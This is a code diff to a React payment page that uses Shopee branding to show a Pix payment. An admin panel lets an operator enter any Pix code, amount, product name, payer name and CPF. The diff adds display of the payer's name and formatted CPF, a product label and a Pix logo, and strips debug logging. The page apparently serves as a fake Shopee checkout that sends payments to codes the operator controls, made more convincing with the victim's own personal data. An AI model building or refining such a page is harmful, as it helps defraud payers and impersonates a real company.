@@ -41,6 +41,18 @@ const EyeOffIcon = () => (
   </svg>
 );
 
+// NOVO: Logo Pix Profissional
+const PixLogo = () => (
+  <svg className="w-8 h-8" viewBox="0 0 512 512" fill="none">
+    <path d="M242.8 181.8L181.8 242.8L242.8 303.8L303.8 242.8L242.8 181.8Z" fill="#32BCAD"/>
+    <path d="M370.8 242.8L431.8 181.8L370.8 120.8L309.8 181.8L370.8 242.8Z" fill="#32BCAD"/>
+    <path d="M242.8 370.8L181.8 309.8L120.8 370.8L181.8 431.8L242.8 370.8Z" fill="#32BCAD"/>
+    <path d="M114.8 242.8L175.8 181.8L114.8 120.8L53.8 181.8L114.8 242.8Z" fill="#32BCAD"/>
+    <path d="M370.8 303.8L309.8 242.8L370.8 181.8L431.8 242.8L370.8 303.8Z" fill="#32BCAD"/>
+    <rect x="160" y="160" width="192" height="192" rx="20" fill="#32BCAD"/>
+  </svg>
+);
+
 const ShopeePixPayment = () => {
   const [isAdmin, setIsAdmin] = useState(false);
   const [showLogin, setShowLogin] = useState(false);
@@ -103,13 +115,11 @@ const ShopeePixPayment = () => {
     setLoading(true);
     setLoginError('');
     try {
-      console.log('🔐 Login em:', `${API_URL}/login`);
       const response = await fetch(`${API_URL}/login`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(loginData)
       });
-      console.log('📡 Status:', response.status);
       const data = await response.json();
       if (response.ok) {
         localStorage.setItem('authToken', data.token);
@@ -121,7 +131,6 @@ const ShopeePixPayment = () => {
         setLoginError(data.message || 'Usuário ou senha incorretos');
       }
     } catch (error) {
-      console.error('❌ Erro:', error);
       setLoginError(`Erro: ${error.message}`);
     } finally {
       setLoading(false);
@@ -177,6 +186,11 @@ const ShopeePixPayment = () => {
     return date.toLocaleDateString('pt-BR', {
       day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit'
     }).replace('.', '');
+  };
+
+  const formatCPF = (cpf) => {
+    if (!cpf) return '';
+    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
   };
 
   if (showLogin && !isAdmin) {
@@ -262,7 +276,7 @@ const ShopeePixPayment = () => {
       <div className="bg-gradient-to-r from-orange-500 via-orange-600 to-red-500 shadow-lg">
         <div className="max-w-2xl mx-auto px-4 py-4">
           <div className="flex items-center gap-3">
-            <div className="bg-white rounded-2xl p-2.5 shadow-lg">
+            <div className="bg-white rounded-2xl p-2.5 shadow-lg" style={{backgroundColor: '#EE4D2D'}}>
               <img 
                 src="/shopee-logo.png" 
                 alt="Shopee Logo" 
@@ -296,13 +310,18 @@ const ShopeePixPayment = () => {
                 </p>
               </div>
             </div>
+
+            {/* NOVO: Produto */}
+            {currentPayment?.nomeProduto && (
+              <div className="mb-4 bg-blue-50 border border-blue-200 rounded-lg p-3">
+                <p className="text-xs text-gray-600 mb-1">Produto</p>
+                <p className="text-sm font-semibold text-gray-800">{currentPayment.nomeProduto}</p>
+              </div>
+            )}
+
             <div className="mb-5">
               <div className="flex items-center gap-2 mb-3">
-                <div className="w-8 h-8 bg-teal-500 rounded flex items-center justify-center">
-                  <svg className="w-5 h-5 text-white" viewBox="0 0 24 24" fill="currentColor">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
-                  </svg>
-                </div>
+                <PixLogo />
                 <span className="font-semibold text-base">Pix</span>
               </div>
               <div className="bg-white border border-gray-200 rounded-lg p-4 flex justify-center items-center">
@@ -314,6 +333,25 @@ const ShopeePixPayment = () => {
                   </div>
                 )}
               </div>
+
+              {/* NOVO: Pagador e CPF */}
+              {(currentPayment?.nomePagador || currentPayment?.cpfPagador) && (
+                <div className="mt-3 bg-gray-50 border border-gray-200 rounded-lg p-3 space-y-2">
+                  {currentPayment?.nomePagador && (
+                    <div>
+                      <p className="text-xs text-gray-600">Nome do Pagador</p>
+                      <p className="text-sm font-medium text-gray-800">{currentPayment.nomePagador}</p>
+                    </div>
+                  )}
+                  {currentPayment?.cpfPagador && (
+                    <div>
+                      <p className="text-xs text-gray-600">CPF</p>
+                      <p className="text-sm font-mono text-gray-800">{formatCPF(currentPayment.cpfPagador)}</p>
+                    </div>
+                  )}
+                </div>
+              )}
+
               <button
                 onClick={() => currentPayment && copyToClipboard(currentPayment.pixCode)}
                 disabled={!currentPayment}
@@ -355,7 +393,16 @@ const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
   const [payments, setPayments] = useState([]);
   const [showForm, setShowForm] = useState(false);
   const [loading, setLoading] = useState(false);
-  const [formData, setFormData] = useState({ id: '', valor: '', pixCode: '', vencimento: '', qrCodeImage: '' });
+  const [formData, setFormData] = useState({ 
+    id: '', 
+    valor: '', 
+    pixCode: '', 
+    vencimento: '', 
+    qrCodeImage: '',
+    nomeProduto: '',
+    nomePagador: '',
+    cpfPagador: ''
+  });
 
   useEffect(() => { fetchPayments(); }, []);
 
@@ -371,7 +418,7 @@ const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
 
   const handleSubmit = async () => {
     if (!formData.valor || !formData.pixCode || !formData.vencimento) {
-      alert('Por favor, preencha todos os campos');
+      alert('Por favor, preencha os campos obrigatórios (Valor, Código Pix e Vencimento)');
       return;
     }
     setLoading(true);
@@ -391,7 +438,7 @@ const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
         await fetchPayments();
         await loadPayments();
         setShowForm(false);
-        setFormData({ id: '', valor: '', pixCode: '', vencimento: '', qrCodeImage: '' });
+        setFormData({ id: '', valor: '', pixCode: '', vencimento: '', qrCodeImage: '', nomeProduto: '', nomePagador: '', cpfPagador: '' });
       } else {
         alert('Erro ao salvar pagamento');
       }
@@ -439,6 +486,17 @@ const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
     }).replace('.', '');
   };
 
+  const formatCPF = (cpf) => {
+    if (!cpf) return '';
+    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+  };
+
+  const handleCPFInput = (e) => {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length > 11) value = value.slice(0, 11);
+    setFormData({...formData, cpfPagador: value});
+  };
+
   return (
     <div className="min-h-screen bg-gradient-to-br from-orange-50 to-red-50">
       <div className="bg-gradient-to-r from-orange-500 to-red-500 text-white p-4 shadow-lg">
@@ -464,15 +522,27 @@ const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
               <h3 className="font-bold text-lg text-gray-800 mb-4">{formData.id ? 'Editar Pagamento' : 'Criar Novo Pagamento'}</h3>
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div>
-                  <label className="block text-sm font-semibold text-gray-700 mb-2">Valor (R$)</label>
+                  <label className="block text-sm font-semibold text-gray-700 mb-2">Valor (R$) *</label>
                   <input type="number" step="0.01" value={formData.valor} onChange={(e) => setFormData({...formData, valor: e.target.value})} className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-500 focus:outline-none transition" placeholder="23.49" />
                 </div>
                 <div>
-                  <label className="block text-sm font-semibold text-gray-700 mb-2">Vencimento</label>
+                  <label className="block text-sm font-semibold text-gray-700 mb-2">Vencimento *</label>
                   <input type="datetime-local" value={formData.vencimento} onChange={(e) => setFormData({...formData, vencimento: e.target.value})} className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-500 focus:outline-none transition" />
                 </div>
+                <div>
+                  <label className="block text-sm font-semibold text-gray-700 mb-2">Nome do Produto</label>
+                  <input type="text" value={formData.nomeProduto} onChange={(e) => setFormData({...formData, nomeProduto: e.target.value})} className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-500 focus:outline-none transition" placeholder="Ex: iPhone 15 Pro Max 256GB" />
+                </div>
+                <div>
+                  <label className="block text-sm font-semibold text-gray-700 mb-2">Nome do Pagador</label>
+                  <input type="text" value={formData.nomePagador} onChange={(e) => setFormData({...formData, nomePagador: e.target.value})} className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-500 focus:outline-none transition" placeholder="Ex: João Silva Santos" />
+                </div>
+                <div>
+                  <label className="block text-sm font-semibold text-gray-700 mb-2">CPF do Pagador</label>
+                  <input type="text" value={formatCPF(formData.cpfPagador)} onChange={handleCPFInput} className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-500 focus:outline-none transition font-mono" placeholder="000.000.000-00" maxLength="14" />
+                </div>
                 <div className="md:col-span-2">
-                  <label className="block text-sm font-semibold text-gray-700 mb-2">Código Pix (Copia e Cola)</label>
+                  <label className="block text-sm font-semibold text-gray-700 mb-2">Código Pix (Copia e Cola) *</label>
                   <textarea value={formData.pixCode} onChange={(e) => setFormData({...formData, pixCode: e.target.value})} className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-500 focus:outline-none h-28 font-mono text-sm" placeholder="00020126330014br.gov.bcb.pix..." />
                 </div>
                 <div className="md:col-span-2">
@@ -512,7 +582,7 @@ const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
                 <button
                   onClick={() => {
                     setShowForm(false);
-                    setFormData({ id: '', valor: '', pixCode: '', vencimento: '', qrCodeImage: '' });
+                    setFormData({ id: '', valor: '', pixCode: '', vencimento: '', qrCodeImage: '', nomeProduto: '', nomePagador: '', cpfPagador: '' });
                   }}
                   className="bg-gray-300 text-gray-700 px-8 py-3 rounded-lg font-semibold hover:bg-gray-400 transition"
                 >
@@ -534,53 +604,73 @@ const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
               </div>
             ) : (
               payments.map((payment) => (
-                <div key={payment._id} className="bg-white border-2 border-gray-200 rounded-xl p-5 flex items-center justify-between hover:border-orange-300 hover:shadow-md transition">
-                  <div className="flex items-center gap-4">
-                    <img
-                      src={payment.qrCodeUrl}
-                      alt="QR Code"
-                      className="w-20 h-20 rounded-lg border-2 border-orange-200"
-                    />
-                    <div>
-                      <p className="font-bold text-xl text-orange-600">
-                        {formatCurrency(payment.valor)}
-                      </p>
-                      <p className="text-sm text-gray-600 mt-1">
-                        📅 Vence: {formatVencimento(payment.vencimento)}
-                      </p>
-                      <p className="text-xs text-gray-500 mt-2 font-mono bg-gray-50 px-2 py-1 rounded">
-                        {payment.pixCode.substring(0, 35)}...
-                      </p>
+                <div key={payment._id} className="bg-white border-2 border-gray-200 rounded-xl p-5 hover:border-orange-300 hover:shadow-md transition">
+                  <div className="flex items-start justify-between gap-4">
+                    <div className="flex items-start gap-4 flex-1">
+                      <img
+                        src={payment.qrCodeUrl}
+                        alt="QR Code"
+                        className="w-20 h-20 rounded-lg border-2 border-orange-200 flex-shrink-0"
+                      />
+                      <div className="flex-1">
+                        <p className="font-bold text-xl text-orange-600">
+                          {formatCurrency(payment.valor)}
+                        </p>
+                        <p className="text-sm text-gray-600 mt-1">
+                          📅 Vence: {formatVencimento(payment.vencimento)}
+                        </p>
+                        {payment.nomeProduto && (
+                          <p className="text-sm text-blue-600 mt-1">
+                            📦 {payment.nomeProduto}
+                          </p>
+                        )}
+                        {payment.nomePagador && (
+                          <p className="text-sm text-gray-700 mt-1">
+                            👤 {payment.nomePagador}
+                          </p>
+                        )}
+                        {payment.cpfPagador && (
+                          <p className="text-xs text-gray-600 mt-1 font-mono">
+                            CPF: {formatCPF(payment.cpfPagador)}
+                          </p>
+                        )}
+                        <p className="text-xs text-gray-500 mt-2 font-mono bg-gray-50 px-2 py-1 rounded inline-block">
+                          {payment.pixCode.substring(0, 35)}...
+                        </p>
+                      </div>
                     </div>
-                  </div>
-                  <div className="flex gap-2">
-                    <button
-                      onClick={() => {
-                        setFormData({
-                          id: payment._id,
-                          valor: payment.valor,
-                          pixCode: payment.pixCode,
-                          vencimento: payment.vencimento,
-                          qrCodeImage: payment.qrCodeUrl
-                        });
-                        setShowForm(true);
-                      }}
-                      className="p-3 text-blue-600 hover:bg-blue-50 rounded-lg transition"
-                      title="Editar"
-                    >
-                      <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z" />
-                      </svg>
-                    </button>
-                    <button
-                      onClick={() => deletePayment(payment._id)}
-                      className="p-3 text-red-600 hover:bg-red-50 rounded-lg transition"
-                      title="Excluir"
-                    >
-                      <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
-                      </svg>
-                    </button>
+                    <div className="flex gap-2 flex-shrink-0">
+                      <button
+                        onClick={() => {
+                          setFormData({
+                            id: payment._id,
+                            valor: payment.valor,
+                            pixCode: payment.pixCode,
+                            vencimento: payment.vencimento,
+                            qrCodeImage: payment.qrCodeUrl,
+                            nomeProduto: payment.nomeProduto || '',
+                            nomePagador: payment.nomePagador || '',
+                            cpfPagador: payment.cpfPagador || ''
+                          });
+                          setShowForm(true);
+                        }}
+                        className="p-3 text-blue-600 hover:bg-blue-50 rounded-lg transition"
+                        title="Editar"
+                      >
+                        <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z" />
+                        </svg>
+                      </button>
+                      <button
+                        onClick={() => deletePayment(payment._id)}
+                        className="p-3 text-red-600 hover:bg-red-50 rounded-lg transition"
+                        title="Excluir"
+                      >
+                        <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
+                        </svg>
+                      </button>
+                    </div>
                   </div>
                 </div>
               ))
